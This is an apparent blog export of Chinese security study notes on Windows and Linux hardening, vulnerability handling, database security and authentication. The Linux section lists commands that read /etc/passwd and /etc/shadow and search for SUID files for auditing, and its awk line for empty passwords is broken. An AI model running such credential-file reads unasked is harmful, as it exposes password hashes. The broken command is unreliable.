<li>安全标识符（security identify，SID<ul>
<li>是安全主体的代表，标识用户、组和计算机账户的唯一编码</li>
<li>范例：S-1-5-21-213213……（whoami /user可查看</li>
</ul>
</li>
</ul>
<h2 id="用户鉴别"><a href="#用户鉴别" class="headerlink" title="用户鉴别"></a>用户鉴别</h2><ul>
<li>登录信息管理体制</li>
<li>登录验证<ul>
<li>本地登录验证</li>
<li>远程登录验证</li>
</ul>
</li>
<li>账号信息存储（SAM：安全账号管理<ul>
<li>运行期锁定、存储格式加密</li>
<li>仅对system账号有权限，通过服务进行访问控制</li>
</ul>
</li>
<li>Windows用户身份鉴别：本地登录<ul>
<li>GINA，Graphical identification and authentication，图形化识别和验证</li>
<li>LSA，local security authority，本地安全授权</li>
<li>过程：账号密码—GINA—LSA—SAM—本地信息库对比—登录成功</li>
</ul>
</li>
<li>远程登录鉴别协议<ul>
<li>SMB，server message block，口令明文传输</li>
<li>LM，LAN manager，口令哈希传输，强度低</li>
<li>NTLM，NT LAN manager，提高口令散列加密强度、挑战/响应机制</li>
<li>Kerberos：为分布式网络提供单一身份验证</li>
</ul>
</li>
</ul>
<h2 id="系统访问控制-ACL"><a href="#系统访问控制-ACL" class="headerlink" title="系统访问控制-ACL"></a>系统访问控制-ACL</h2><ul>
<li>访问控制列表，access control list，ACL<ul>
<li>NTFS文件系统支持</li>
<li>权限存储流文件系统中</li>
<li>自主访问控制</li>
<li>灵活性高，安全性不高</li>
</ul>
</li>
</ul>
<h2 id="系统访问控制-用户账号控制"><a href="#系统访问控制-用户账号控制" class="headerlink" title="系统访问控制-用户账号控制"></a>系统访问控制-用户账号控制</h2><ul>
<li>用户账号控制，user account control，uac<ul>
<li>完全访问令牌</li>
<li>标准受限访问令牌</li>
</ul>
</li>
</ul>
<h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2><ul>
<li>NTFS文件系统权限控制（ACL<ul>
<li>文件、文件夹、注册表键值、打印机等对象</li>
</ul>
</li>
<li>安全加密<ul>
<li>EFS，encrypting file system<ul>
<li>Windows内置，与文件系统高度集成</li>
<li>对Windows用户透明</li>
<li>对称与非对称算法结合</li>
</ul>
</li>
<li>bitlocker<ul>
<li>对整个操作系统卷加密</li>
<li>解决设备物理丢失安全问题</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="系统审计机制"><a href="#系统审计机制" class="headerlink" title="系统审计机制"></a>系统审计机制</h2><ul>
<li>Windows日志<ul>
<li>系统</li>
<li>应用程序</li>
<li>安全</li>
<li>设置</li>
</ul>
</li>
<li>应用程序和服务日志</li>
<li>应用访问日志<ul>
<li>FTP访问日志</li>
<li>IIS访问日志</li>
</ul>
</li>
</ul>
<h2 id="系统安全策略"><a href="#系统安全策略" class="headerlink" title="系统安全策略"></a>系统安全策略</h2><ul>
<li>账户策略<ul>
<li>密码策略</li>
<li>账户锁定策略</li>
</ul>
</li>
<li>本地策略<ul>
<li>审核策略</li>
<li>用户权限分配</li>
<li>安全选项</li>
</ul>
</li>
</ul>
<h2 id="系统安全配置"><a href="#系统安全配置" class="headerlink" title="系统安全配置"></a>系统安全配置</h2><ol>
<li>安全配置前置工作<ul>
<li>安全的安装<ul>
<li>分区设置：不要只使用一个分区</li>
<li>系统补丁：SP+hotfix</li>
</ul>
</li>
<li>补丁更新设置<ul>
<li>检查更新</li>
<li>自动下载安装或手动</li>
</ul>
</li>
</ul>
</li>
<li>账号安全设置<ul>
<li>保护账号安全<ul>
<li>默认管理账号administrator更名</li>
<li>设置好的口令：自己容易记，别人不好猜</li>
</ul>
</li>
<li>系统账号策略设置<ul>
<li>密码策略：避免系统出现弱口令（如长度最小值、最短使用期限、强制密码历史，即使用几次的历史密码不允许使用</li>
<li>账号锁定策略：应对口令暴力破解（如账号锁定时间、账号锁定阀值、重置账号锁定计数器</li>
</ul>
</li>
<li>账号安全选项设置</li>
<li>账号权限控制-用户权限分配<ul>
<li>从网络访问这台计算机</li>
<li>拒绝从网络访问这台计算机</li>
<li>管理审核和安全日志</li>
<li>从远程系统强制关机</li>
</ul>
</li>
<li>账号权限控制-设置唤醒密码<ul>
<li>设置唤醒计算机时的登录密码</li>
<li>设置屏幕保护恢复时的登录密码</li>
</ul>
</li>
</ul>
</li>
<li>关闭自动播放<ul>
<li>自动播放功能：为方便用户而设计</li>
<li>恶意代码借助存储介质传播的方式</li>
<li>关闭自动播放：可以有效阻断U盘病毒的传播路径</li>
</ul>
</li>
<li>远程访问控制<ul>
<li>网络访问控制<ul>
<li>防火墙设置：确保启用Windows自带防火墙</li>
<li>防火墙高级配置<ul>
<li>出战规则</li>
<li>入站规则</li>
<li>连接安全规则</li>
<li>监视<ul>
<li>防火墙</li>
<li>连接安全规则</li>
<li>安全关联</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>共享安全防护<ul>
<li>共享相关风险<ul>
<li>IPC$的安全问题（空会话连接导致信息泄漏</li>
<li>管理共享风险（远程文件操作</li>
<li>普通共享的风险（远程文件操作</li>
</ul>
</li>
<li>关闭管理共享<ul>
<li>空会话连接控制：本地安全策略设置中对匿名访问的限制</li>
<li>关闭管理共享：修改注册表</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>本地安全策略<ul>
<li>审核策略</li>
<li>用户权限分配</li>
<li>安全选项（位置：管理工具-本地安全策略-安全设置-本地策略-安全选项<ul>
<li>交互式登录：无须按ctrl+alt+del，设置为已禁用</li>
<li>交互式登录：不显示最后的用户名，设置为已启用</li>
<li>设备：将CD-ROM的访问权限仅限于本地登录的用户，设置为已启用</li>
<li>网络访问：不允许SAM账号的匿名枚举，设置为已启用</li>
<li>网络访问：可匿名访问的共享，删除策略设置里的值</li>
<li>网络访问：可匿名访问的命名管道，删除策略设置里的值</li>
<li>网络访问：可远程访问的注册表路径，删除策略设置里的值</li>
</ul>
</li>
</ul>
</li>
<li>服务运行安全设置<ul>
<li>Windows服务：win服务程序是一个长时间运行的可执行程序，不需要用户的交互、登录</li>
<li>关闭不需要的：如计划任务、远程操作注册表</li>
<li>控制服务权限：system（本地系统）、local service、network service</li>
</ul>
</li>
<li>使用第三方安全增强软件<ul>
<li>防病毒软件<ul>
<li>要安装：恶意代码是终端安全的最大威胁</li>
<li>确保病毒库更新：病毒防护软件主要工作机制是特征码扫描</li>
<li>开启云查杀</li>
</ul>
</li>
<li>系统安全防护软件<ul>
<li>系统安全防护软件</li>
<li>影子系统</li>
<li>主机入侵检测</li>
</ul>
</li>
</ul>
</li>
</ol>
<h1 id="1-3-Linux系统安全机制"><a href="#1-3-Linux系统安全机制" class="headerlink" title="1.3-Linux系统安全机制"></a>1.3-Linux系统安全机制</h1><h2 id="系统标识与鉴别"><a href="#系统标识与鉴别" class="headerlink" title="系统标识与鉴别"></a>系统标识与鉴别</h2><ul>
<li>安全主体<ul>
<li>用户：身份标识（User ID</li>
<li>组：身份标识（Group ID</li>
</ul>
</li>
<li>用户与组基本概念<ul>
<li>文件必须有所有者</li>
<li>用户必须属于某个或多个组</li>
<li>用户与组的关系灵活（一对多、多对多都可以</li>
<li>root用户拥有所有权限</li>
</ul>
</li>
<li>账号信息存储<ul>
<li>用户信息<ul>
<li>/etc/passwd（账号</li>
<li>/etc/shadow（密码</li>
</ul>
</li>
<li>组信息<ul>
<li>/etc/group</li>
<li>/etc/gshadow</li>
</ul>
</li>
</ul>
</li>
<li>用户信息文件-passwd<ul>
<li>用于存放用户信息</li>
<li>特点：文本格式、全局可读</li>
<li>存储条目格式：name:coded-passwd:UID:GID:userinfo:homedirectory:shell</li>
</ul>
</li>
<li>用户账号影子文件-shadow<ul>
<li>用于存放用户密码散列、密码管理信息等</li>
<li>特点：文本格式、仅对root可读可写</li>
<li>存储条目格式：name:passwd:lastchg:min:max:warn:inactive:expire:flag</li>
</ul>
</li>
<li>口令鉴别<ul>
<li>本地登录</li>
<li>远程登录（telnet、FTP等</li>
</ul>
</li>
<li>主机信任（基于证书</li>
<li>PAM（可插拔验证模块</li>
</ul>
<h2 id="系统访问控制-权限模式"><a href="#系统访问控制-权限模式" class="headerlink" title="系统访问控制-权限模式"></a>系统访问控制-权限模式</h2><ul>
<li>文件/目录权限基本概念<ul>
<li>权限类型：读、写、执行</li>
<li>权限表示方式：模式位</li>
<li>如：drwxr-xr-x</li>
</ul>
</li>
<li>权限的数字表示法：rwx=111=7，r-x=101=5</li>
<li>权限的特殊属性：SUID（临时获得文件属主权限，故用户可以更改自己密码，而原本用户对改密码文件是没有权限的）、SGID、Sticky（防删除</li>
</ul>
<h2 id="安全审计-日志系统"><a href="#安全审计-日志系统" class="headerlink" title="安全审计-日志系统"></a>安全审计-日志系统</h2><ul>
<li>系统日志类型<ul>
<li>连接时间日志<ul>
<li>/var/log/wtmp和/var/run/utmp</li>
<li>由多个程序执行，记录用户登录时间</li>
</ul>
</li>
<li>进程统计<ul>
<li>由系统内核执行，为系统基本服务提供命令使用统计</li>
</ul>
</li>
<li>错误日志<ul>
<li>/var/log/messages</li>
<li>由syslogd守护记录，制定注意的事项</li>
</ul>
</li>
</ul>
</li>
<li>应用程序日志：如HTTP、FTP等创建的日志</li>
</ul>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><ul>
<li>文件系统类型<ul>
<li>日志文件系统：Rxt4、Ext3、XFS、JFS等</li>
</ul>
</li>
<li>文件系统安全<ul>
<li>访问权限</li>
<li>文件系统加密<ul>
<li>eCryptfs（Enterprise Cryptographic Filesystem</li>
<li>基于内核，安全性高，用户操作便利</li>
<li>加密元数据写在每个加密文件的头部，方便迁移、备份</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="特权管理"><a href="#特权管理" class="headerlink" title="特权管理"></a>特权管理</h2><ul>
<li>特权划分<ul>
<li>分割管理权限，30多种管理特权</li>
<li>根用户（root）拥有所有特权</li>
<li>普通用户特权操作实现：setuid、setgid</li>
</ul>
</li>
<li>特权保护：保护root账号<ul>
<li>不直接使用root登录，普通用户su成为root</li>
<li>控制root权限使用</li>
</ul>
</li>
</ul>
<h2 id="系统安全配置-1"><a href="#系统安全配置-1" class="headerlink" title="系统安全配置"></a>系统安全配置</h2><ol>
<li>安全配置前置工作<ul>
<li>系统安装<ul>
<li>使用官方/正版软件</li>
<li>分区挂载重要目录：根目录/，用户目录/home，临时目录/tmp等应该分开到不同的磁盘分区</li>
<li>自定义安装，选择需要的软件包：不安装全部软件包，尤其是那些不需要的网路服务包</li>
</ul>
</li>
<li>系统补丁<ul>
<li>及时安装系统补丁</li>
<li>更新补丁前，先在测试系统上对补丁的可用性和兼容性进行验证</li>
</ul>
</li>
</ul>
</li>
<li>账号和口令安全<ul>
<li>账号通用配置<ul>
<li>检查、清除系统中多余账号（检查：cat /etc/passwd、cat /etc/shadow</li>
<li>锁定账号<ul>
<li>特殊保留的系统伪账户，可以设置锁定登录</li>
<li>锁定命令：#passwd -l 用户名</li>
<li>解锁命令：#passwd -u 用户名</li>
</ul>
</li>
<li>禁用root之外的所有超级用户<ul>
<li>打开系统账号文件/etc/passwd</li>
<li>若用户ID=0，则表示该用户拥有超级用户的权限</li>
<li>检查是否有多个ID=0</li>
<li>禁用或删除多余的账号</li>
</ul>
</li>
<li>检查是否存在空口令账户<ul>
<li>执行命令：awk -F:’(== “”){print $1}’ /etc/shadow</li>
<li>如果存在空口令账户，则对其进行锁定，或要求增加密码</li>
<li>要确认空口令账户是否和已有应用关联，增加密码是否会引起应用无法连接的问题</li>
</ul>
</li>
<li>设置账户锁定登录失败锁定次数、锁定时间（system-auth文件</li>
<li>修改账户超时值，设置自动注销时间（profile文件</li>
</ul>
</li>
<li>保护root账号<ul>
<li>root账号权限很高</li>
<li>保护措施<ul>
<li>禁止使用root登录系统</li>
<li>只允许普通用户登陆，可通过su命令切换到root</li>
<li>不随意把root shell留在终端上</li>
<li>不把当前目录./和普通用户的bin目录放在root账号的环境变量PATH中</li>
<li>不以root运行其他用户的或不熟悉的程序</li>
</ul>
</li>
</ul>
</li>
<li>口令安全策略<ul>
<li>使用安全口令：口令长度、字符要求</li>
<li>口令修改策略<ul>
<li>强制口令使用有效期</li>
<li>设置口令修改提醒</li>
<li>设置账户锁定登录失败锁定次数、锁定时间</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>系统服务配置<ul>
<li>禁止危险的网络服务：telnet、FTP、echo、chargen、shell等</li>
<li>关闭非必需的网络服务：talk、ntalk等</li>
<li>确保最新版本：使用最新的、最安全的版本</li>
</ul>
</li>
<li>远程登录安全<ul>
<li>禁用telnet，使用SSH进行管理</li>
<li>限制能够登录本机的IP地址（sshd_config文件</li>
<li>禁止root用户远程登录（sshd_config</li>
<li>限定信任主机</li>
<li>修改banner 信息</li>
</ul>
</li>
<li>文件和目录安全<ul>
<li>保护重要的文件目录，限制用户访问<ul>
<li>设置文件的属主和属性以进行保护</li>
<li>重要的文件或目录设置为不可改变属性：chattr +i /etc/passwd</li>
</ul>
</li>
<li>临时文件不应该有执行权限</li>
<li>设置新创建文件的默认权限掩码：可根据要求设置新文件的默认访问权限，如仅允许文件属主访问，不允许其他人访问</li>
<li>umask设置的是权限补码</li>
<li>设置方法：<ul>
<li>使用umask命令，如#umask 066</li>
<li>编辑/etc/profile文件，设置umask值</li>
</ul>
</li>
<li>检查SUID/SGID文件<ul>
<li>SUID/SGID的程序在运行时，将有效用户ID改变为该程序的所有者（组）ID，因为可能存在一定的安全隐患</li>
<li>找出系统中所有含s“位的程序，把不必要的s位去掉，或者把根本不用的直接删除，可防止用户滥用及提升权限的可能性</li>
<li>查找SUID可执行程序#find / -perm -4000 -user 0 -ls</li>
<li>查找SGID程序 # find / -perm -2000 -user 0 -ls</li>
</ul>
</li>
</ul>
</li>
<li>系统日志配置<ul>
<li>审查日志中不正常情况<ul>
<li>非常规时间登录</li>
<li>日志残缺</li>
<li>Su的使用</li>
<li>服务的启动情况</li>
</ul>
</li>
<li>启用syslog服务</li>
<li>配置日志存储策略：打开syslog文件，检查其对日志存储空间的大小和时间的设置</li>
<li>使用syslog设备：syslog.conf设置、使用syslog日志服务器</li>
</ul>
</li>
<li>使用安全软件<ul>
<li>启用主机防火墙</li>
<li>使用最新版本安全软件：用官方的、最新的</li>
<li>Linux下的防火墙框架iptables<ul>
<li>已内嵌到Linux系统中、功能较强大</li>
<li>功能：包过滤、NAT、数据包处理</li>
<li>建议设置开机自启</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>操作系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之安全漏洞与数据库安全</title>
    <url>/2019/01/16/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="1-1-安全漏洞的产生与发展"><a href="#1-1-安全漏洞的产生与发展" class="headerlink" title="1.1-安全漏洞的产生与发展"></a>1.1-安全漏洞的产生与发展</h1><h2 id="安全漏洞的基本概念"><a href="#安全漏洞的基本概念" class="headerlink" title="安全漏洞的基本概念"></a>安全漏洞的基本概念</h2><ul>
<li><p>何为漏洞？</p>
<p>也称脆弱性，计算机系统天生的类似基因的缺陷，在使用和发展过程中产生意想不到的问题（冯诺伊曼</p>
</li>
<li><p>漏洞的含义：<a id="more"></a></p>
<ul>
<li>漏洞本身随着信息技术的发展而具有不同的含义和范畴</li>
<li>基于访问控制的定义，逐步发展到，设计系统安全流程、设计、实施、内部控制等全过程的定义</li>
</ul>
</li>
<li><p>学者们对漏洞的定义</p>
<ul>
<li>从访问控制角度定义</li>
<li>从风险管理角度的定义</li>
<li>使用状态空间描述的方法定义</li>
</ul>
</li>
<li><p>标准机构的定义</p>
<ul>
<li>存在于评估对象中，违反安全功能要求的弱点</li>
<li>威胁源可以攻击或触发的信息系统、系统安全流程、内部控制或实施中的弱点</li>
<li>威胁可以利用的一个或一组资产的弱点；是评估对象TOE中的弱点；是在信息系统或其环境的设计及实施中的缺陷、弱点或特性</li>
</ul>
</li>
<li><p>漏洞的理解</p>
<ul>
<li>从生命周期的角度出发</li>
<li>信息技术、产品、系统在需求、设计、实现、配置、维护和使用等过程中</li>
<li>有意或无意产生的缺陷</li>
<li>这些缺陷一旦被恶意主体所利用</li>
<li>就会造成对信息产品或系统的安全损害</li>
<li>从而影响构建于信息产品或系统之上正常服务的运行</li>
<li>危害信息产品或系统的安全属性</li>
</ul>
</li>
<li><p>安全缺陷：是信息系统或产品自身“与生俱来”的特征，是其的固有成分</p>
</li>
</ul>
<h2 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h2><ul>
<li>技术原因：<ul>
<li>软件系统复杂性提高，质量难以控制，安全性降低</li>
<li>公用模版的使用引发了安全问题</li>
</ul>
</li>
<li>经济原因<ul>
<li>柠檬市场效应（没人再愿意花高成本造高质量产品</li>
</ul>
</li>
<li>环境原因<ul>
<li>从传统的封闭、静态和可控变为开放、动态和难控</li>
<li>攻易守难</li>
</ul>
</li>
</ul>
<h2 id="漏洞的分类"><a href="#漏洞的分类" class="headerlink" title="漏洞的分类"></a>漏洞的分类</h2><ul>
<li>分类的目的<ul>
<li>准确的区分和描述不同的漏洞</li>
<li>有助于漏洞的发布、存储和查询</li>
</ul>
</li>
<li>分类实例：<ul>
<li>NVD：代码注入等21种类型</li>
<li>CNNVD：根据漏洞形成分成22种类型</li>
</ul>
</li>
</ul>
<h1 id="1-2-安全漏洞的发现与修复"><a href="#1-2-安全漏洞的发现与修复" class="headerlink" title="1.2-安全漏洞的发现与修复"></a>1.2-安全漏洞的发现与修复</h1><ul>
<li>漏洞的发现<ul>
<li>静态漏洞挖掘</li>
<li>动态漏洞挖掘</li>
</ul>
</li>
</ul>
<h2 id="静态漏洞挖掘"><a href="#静态漏洞挖掘" class="headerlink" title="静态漏洞挖掘"></a>静态漏洞挖掘</h2><ul>
<li>不运行代码而直接对代码进行漏洞挖掘的方法</li>
<li>适用对象<ul>
<li>完整的或不完整的源代码</li>
<li>二进制代码</li>
<li>中间代码片段</li>
</ul>
</li>
<li>方法<ul>
<li>流分析</li>
<li>符号执行</li>
<li>模型检测</li>
</ul>
</li>
</ul>
<h2 id="动态漏洞挖掘"><a href="#动态漏洞挖掘" class="headerlink" title="动态漏洞挖掘"></a>动态漏洞挖掘</h2><ul>
<li>在代码运行的状态下，通过检测代码的运行状态，或根据测试用例结果来挖掘漏洞的方法</li>
<li>特点：与静态相比，动态分析方法的优势在于其分析结果的精确，即误报率低</li>
<li>方法<ul>
<li>模糊测试</li>
<li>动态污染传播</li>
</ul>
</li>
</ul>
<h2 id="安全漏洞的修复"><a href="#安全漏洞的修复" class="headerlink" title="安全漏洞的修复"></a>安全漏洞的修复</h2><ul>
<li>安装补丁是主要技术手段之一</li>
<li>补丁修复相关问题<ul>
<li>打什么样的补丁？补丁质量问题</li>
<li>如何打补丁？操作方式问题</li>
<li>什么时间打补丁？修复时机问题</li>
</ul>
</li>
<li>补丁分类<ul>
<li>文件类型：源代码形式、二进制形式</li>
<li>内存角度：文件补丁（冷补丁）、内存补丁（热补丁）</li>
</ul>
</li>
<li>补丁安装时要注意的问题<ul>
<li>补丁安装部署之前需要经过必要的测试</li>
<li>需要从可靠来源不断获取最新补丁信息</li>
<li>安装补丁时，要做好备份和相应的应急措施</li>
</ul>
</li>
<li>标准化的安全配置：美军率先推行标准化的安全配置与核查IAVA</li>
<li>根据漏洞分析和风险评估的安全加固：传统的安全加固手段越来越难以应付日益复杂的攻击行为，漏洞信息的及时披露和分发越来越重要</li>
<li>加固核查与问责：通过安全审计核实漏洞消除情况和效果。</li>
</ul>
<h1 id="1-3-漏洞案例与利用"><a href="#1-3-漏洞案例与利用" class="headerlink" title="1.3-漏洞案例与利用"></a>1.3-漏洞案例与利用</h1><p>（见metasploit相关）</p>
<h1 id="1-4-数据库安全"><a href="#1-4-数据库安全" class="headerlink" title="1.4-数据库安全"></a>1.4-数据库安全</h1><h2 id="数据库系统基本概念"><a href="#数据库系统基本概念" class="headerlink" title="数据库系统基本概念"></a>数据库系统基本概念</h2><ul>
<li>数据库：长期存储在计算机内的、有组织的、可共享的数据集合</li>
<li>DBMS：<ul>
<li>一种操纵和管理数据库的大型软件</li>
<li>用于建立、使用、维护数据库</li>
<li>对数据库进行统一的管理和控制</li>
<li>以保证数据库的安全性和完整性</li>
</ul>
</li>
<li>用户请求——DBMS——数据库（类似：用户请求——图书管理员——图书馆）</li>
<li>数据库系统关系<ul>
<li>数据库—操作系统—DBMS—应用开发工具—应用系统</li>
<li>数据库和DBMS：数据库管理员</li>
<li>应用开发工具：程序员</li>
<li>应用系统：用户</li>
</ul>
</li>
</ul>
<h2 id="关系型数据库系统特点"><a href="#关系型数据库系统特点" class="headerlink" title="关系型数据库系统特点"></a>关系型数据库系统特点</h2><ul>
<li>数据结构化和共享性<ul>
<li>库、表、字段</li>
<li>结构化查询语言SQL</li>
</ul>
</li>
<li>数据独立性：物理独立性、逻辑独立性</li>
<li>数据的完整性约束<ul>
<li>实体完整性（通过主键约束条件</li>
<li>参照完整性（通过主外键约束条件</li>
<li>用户自定义完整性（通过CHECK子句</li>
</ul>
</li>
<li>数据由DBMS统一管理和控制：查询引擎、事务控制、数据存储模块</li>
</ul>
<h2 id="结构化查询语句"><a href="#结构化查询语句" class="headerlink" title="结构化查询语句"></a>结构化查询语句</h2><ul>
<li>SQL语句格式<ul>
<li>基本语句约30条，每条语句都请求DBMS完成一个动作</li>
<li>如：delete from table_name where column_name &lt; 1<ul>
<li>delete：动词</li>
<li>from：关键字</li>
<li>有表名、列名</li>
<li>where引导子句</li>
<li>where后跟表达式</li>
</ul>
</li>
<li>SQL语句分类<ul>
<li>数据定义：create</li>
<li>数据查询：select</li>
<li>数据操纵：update</li>
<li>数据控制：grant</li>
<li>事务控制：begin</li>
<li>嵌入式/服务端编程：open</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><ul>
<li>保密性：数据泄漏</li>
<li>完整性：执行正确的修改操作</li>
<li>可用性：数据库死锁，性能下降或无法访问</li>
</ul>
<h2 id="数据库安全需求"><a href="#数据库安全需求" class="headerlink" title="数据库安全需求"></a>数据库安全需求</h2><ul>
<li>物理数据库完整性</li>
<li>逻辑数据库完整性</li>
<li>数据单元安全性</li>
<li>可审计</li>
<li>访问控制</li>
</ul>
<h2 id="数据库安全措施"><a href="#数据库安全措施" class="headerlink" title="数据库安全措施"></a>数据库安全措施</h2><ul>
<li>用户标识与鉴别<ul>
<li>用户鉴别<ul>
<li>操作系统</li>
<li>数据库</li>
<li>第三方</li>
</ul>
</li>
<li>用户管理策略<ul>
<li>默认账号管理</li>
<li>账号锁定策略</li>
</ul>
</li>
</ul>
</li>
<li>授权与访问控制<ul>
<li>设置用户对不同的数据对象允许的操作权限<ul>
<li>系统权限：数据库实例级或数据库级</li>
<li>模式权限：数据库对象：表、视图</li>
<li>数据对象权限：数据对象：记录级</li>
</ul>
</li>
<li>资源控制<ul>
<li>CPU资源</li>
<li>会话资源<ul>
<li>每用户session</li>
<li>连接超时</li>
<li>死锁控制</li>
</ul>
</li>
<li>存储资源<ul>
<li>护具存储空间限制</li>
<li>临时存储空间限制</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>数据加密<ul>
<li>数据加密方式<ul>
<li>传输加密</li>
<li>存储加密</li>
</ul>
</li>
<li>数据存储加密层级<ul>
<li>os层加密</li>
<li>DBMS内核层加密</li>
<li>DBMS外层加密</li>
</ul>
</li>
</ul>
</li>
<li>安全审计<ul>
<li>数据库审计（也称标准审计<ul>
<li>用户级审计：安全审计员设置，用户行为审计</li>
<li>系统级审计：管理员设置，用户授权或系统权限操作审计</li>
</ul>
</li>
<li>细粒度审计<ul>
<li>监视对数据对象的操作</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="数据库完整性"><a href="#数据库完整性" class="headerlink" title="数据库完整性"></a>数据库完整性</h2><ul>
<li>完整性保证：完整性约束</li>
<li>完整功能性约束条件<ul>
<li>实体完整性（primary key定义，唯一，不为空</li>
<li>域完整性（表定义中的check、foreign key约束，default、not null定义</li>
<li>参照完整性（foreign key定义，关联</li>
<li>用户定义完整性（生成时定义，非空，唯一，布尔</li>
</ul>
</li>
</ul>
<h2 id="数据备份与恢复"><a href="#数据备份与恢复" class="headerlink" title="数据备份与恢复"></a>数据备份与恢复</h2><ul>
<li>备份：数据冗余技术<ul>
<li>数据转储</li>
<li>日志文件</li>
</ul>
</li>
<li>恢复：从冗余数据中实施数据库恢复<ul>
<li>事务故障的恢复（事务处理</li>
<li>系统故障的恢复（事务处理</li>
<li>介质故障的恢复（通过转储数据恢复</li>
</ul>
</li>
</ul>
<h2 id="数据库运行安全防护"><a href="#数据库运行安全防护" class="headerlink" title="数据库运行安全防护"></a>数据库运行安全防护</h2><ul>
<li><p>数据库面临的安全威胁：特权滥用、平台级数据库漏洞、SQL注入、拒绝服务攻击、不健全的审计和认证、数据泄漏、数据库通信协议漏洞</p>
</li>
<li><p>层层设防：防护体系建设</p>
<ul>
<li>SQL请求—用户标识与鉴别–DBMS存取控制–数据加密–审计追踪</li>
<li>对应于：各种应用–安全边界–查询引擎—DBMS选件–事务引擎</li>
</ul>
</li>
<li><p>检查、监控、审计（事前、中、后</p>
<ul>
<li><p>事前检测：安全特性检测</p>
<ul>
<li>安全配置：补丁、协议</li>
<li>账号：用户名密码、口令策略、权限</li>
<li>存储过程</li>
<li>触发器</li>
<li>备份</li>
</ul>
</li>
<li>事中运行监控</li>
<li>事后审计<ul>
<li>审计对象（对谁进行审计<ul>
<li>标准审计（系统级、用户级</li>
<li>细粒度审计（对象级</li>
</ul>
</li>
<li>审计内容（对什么行为进行审计<ul>
<li>访问数据库应用程序、位置及用户信息</li>
<li>用户操作的数据、操作是否成功</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>安全漏洞</tag>
        <tag>数据库安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之鉴别与访问控制</title>
    <url>/2019/01/15/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E9%89%B4%E5%88%AB%E4%B8%8E%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<h1 id="1-1-身份鉴别"><a href="#1-1-身份鉴别" class="headerlink" title="1.1-身份鉴别"></a>1.1-身份鉴别</h1><h2 id="标识与鉴别"><a href="#标识与鉴别" class="headerlink" title="标识与鉴别"></a>标识与鉴别</h2><ul>
<li>标识：是实体身份的一种计算机表达，每个实体与计算机内部的一个身份表达绑定</li>
<li>鉴别：确认实体是它所表明的，提供了关于某个实体身份的保证，某一实体确信与之打交道的实体正是所需要的实体</li>
<li>标识与鉴别的作用：<ul>
<li>作为访问控制的一种必要支持，访问控制的执行依赖于确认的身份</li>
<li>作为数据源认证的一种方法<a id="more"></a></li>
<li>作为审计追踪的支持</li>
</ul>
</li>
</ul>
<h2 id="鉴别的基本概念"><a href="#鉴别的基本概念" class="headerlink" title="鉴别的基本概念"></a>鉴别的基本概念</h2><ul>
<li>鉴别系统的构成：验证者、被验证者、可信赖者</li>
<li>鉴别的类型：单向鉴别、双向鉴别、第三方鉴别</li>
<li>鉴别的方式：<ul>
<li>基于实体所知（知识、密码、PIN码</li>
<li>基于实体所有（身份证、钥匙、智能卡、令牌</li>
<li>基于实体特征（指纹、笔迹、声音、视网膜</li>
<li>双因素、多因素认证</li>
</ul>
</li>
</ul>
<h2 id="基于实体所知的鉴别"><a href="#基于实体所知的鉴别" class="headerlink" title="基于实体所知的鉴别"></a>基于实体所知的鉴别</h2><ul>
<li>使用最广泛的身份鉴别方法：实现简单、成本低、提供弱鉴别</li>
<li>面临的威胁：暴力破解、木马窃取、线路窃听、重放攻击</li>
</ul>
<h2 id="密码暴力破解安全防护"><a href="#密码暴力破解安全防护" class="headerlink" title="密码暴力破解安全防护"></a>密码暴力破解安全防护</h2><ul>
<li>使用安全的密码（自己容易记，别人不好猜</li>
<li>系统、应用安全策略（账号锁定策略</li>
<li>随机验证码<ul>
<li>变形</li>
<li>干扰</li>
<li>滑块</li>
<li>图像识别</li>
</ul>
</li>
</ul>
<h2 id="木马窃取密码安全防护"><a href="#木马窃取密码安全防护" class="headerlink" title="木马窃取密码安全防护"></a>木马窃取密码安全防护</h2><ul>
<li>使用密码输入控件<ul>
<li>安全的输入框，避免从输入框中还原密码</li>
<li>软键盘，对抗击键记录</li>
<li>随机排列字符，对抗屏幕截图重现</li>
</ul>
</li>
</ul>
<h2 id="密码嗅探攻击安全防护"><a href="#密码嗅探攻击安全防护" class="headerlink" title="密码嗅探攻击安全防护"></a>密码嗅探攻击安全防护</h2><ul>
<li>加密：单向函数</li>
<li>攻击者很容易构造一张q与p对应的表，表中的p尽可能包含所期望的值<ul>
<li>解决办法：在口令中使用随机数</li>
</ul>
</li>
<li>一次性口令：每次鉴别中所使用的密码不同<ul>
<li>有效应对密码嗅探及重放攻击</li>
</ul>
</li>
<li>实现机制<ul>
<li>两端共同拥有一串随机口令，在该串的某一位置保持同步</li>
<li>两端共同使用一个随机序列生成器，在该序列生成器的初态保持同步</li>
<li>使用时间戳，两端维持同步的时钟</li>
</ul>
</li>
</ul>
